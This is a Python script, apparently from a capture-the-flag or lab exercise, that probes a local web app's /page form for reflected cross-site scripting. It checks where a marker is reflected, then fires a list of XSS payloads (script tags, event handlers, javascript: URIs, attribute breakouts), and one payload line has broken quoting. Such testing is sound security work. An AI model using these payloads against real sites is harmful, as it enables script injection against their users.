import requests
import re

base_url = "http://127.0.0.1:33202"

print("="*80)
print("TESTING XSS EXECUTION - Finding injection context")
print("="*80)

# First, let's analyze where our input gets reflected exactly
marker = 'MARKER_XSS_TEST_123'
data = {'solution': marker}

try:
    response = requests.post(f"{base_url}/page", data=data, timeout=10)
    print(f"\n[*] Posted marker: {marker}")
    print(f"[*] Status: {response.status_code}")
    print(f"[*] Response length: {len(response.text)} bytes")
    
    # Find the marker in the response
    pos = response.text.find(marker)
    if pos != -1:
        print(f"\n[!] MARKER FOUND at position {pos}")
        
        # Extract context around the marker
        start = max(0, pos - 300)
        end = min(len(response.text), pos + len(marker) + 300)
        context = response.text[start:end]
        
        print(f"\nContext around marker:")
        print("="*80)
        print(context)
        print("="*80)
        
        # Check what's before and after
        before = response.text[:pos]
        after = response.text[pos+len(marker):]
        
        print(f"\n[DEBUG] Last 100 chars before marker:")
        print(repr(before[-100:]))
        print(f"\n[DEBUG] First 100 chars after marker:")
        print(repr(after[:100]))
        
        # Check if marker is inside the input value attribute or outside
        if 'value="' in before[-50:]:
            print(f"\n[!] MARKER IS INSIDE value=\"\" ATTRIBUTE")
            print(f"[!] This is an INBOUND reflection - input value is reflected")
        else:
            # Check if it's after the input tag
            input_end = before.rfind('</article>')
            if input_end != -1 and pos > input_end:
                print(f"\n[!] MARKER IS AFTER THE input ELEMENT!")
                print(f"[!] This means we can inject NEW HTML elements!")
    
except requests.exceptions.RequestException as e:
    print(f"[!] Error: {e}")

# Now test XSS payloads
print(f"\n\n{'='*80}")
print("TESTING XSS PAYLOADS")
print("="*80)

test_payloads = [
    # Try to break out and inject script
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    "';"><script>alert(1)</script>",
    '" onmouseover="alert(1)">',
    '" autofocus onfocus="alert(1)">',
    '<body onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<math><mi/xlink:href="data:x,<script>alert(1)</script>">',
    '<svg><script>alert(1)</script>',
    '<embed src=javascript:alert(1)>',
    '<object data=javascript:alert(1)>',
    '<img src="javascript:alert(1)">',
    '<input type=image src=x onerror=alert(1)>',
    '<form><button formaction=javascript:alert(1)>XSS</button></form>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<svg><animatetransform onbegin=alert(1) attributeName=transform dur=1s>',
    '<math href="javascript:alert(1)">CLICKME',
    '<iframe src="data:text/html,<script>alert(1)</script>">',
    # Try to inject after the input
    '"></form><script>alert(1)</script><form>',
    '"><img src=x onerror=alert(1)><x "',
]

for i, payload in enumerate(test_payloads, 1):
    print(f"\n{'-'*80}")
    print(f"Test {i:2d}: {payload}")
    print(f"{'-'*80}")
    
    data = {'solution': payload}
    try:
        response = requests.post(f"{base_url}/page", data=data, timeout=10)
        
        # Check if payload is reflected as-is (not encoded)
        if payload in response.text:
            print(f"[!] PAYLOAD REFLECTED WITHOUT ENCODING!")
            
            # Find exact position
            pos = response.text.find(payload)
            start = max(0, pos - 200)
            end = min(len(response.text), pos + len(payload) + 200)
            context = response.text[start:end]
            
            print(f"\nContext:")
            print(context)
            print("\n[+] This is a POTENTIAL XSS VECTOR!")
            
            # Check if we can see the full HTML structure
            if 'document' in response.text:
                print(f"\n[!] HTML TAGS PRESENT - XSS LIKELY WORKS!")
        elif payload.replace('<', '&lt;').replace('>', '&gt;') in response.text:
            print(f"[-] Payload is HTML-encoded (safe)")
        else:
            print(f"[-] Payload not reflected")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Error: {e}")

print(f"\n{'='*80}")
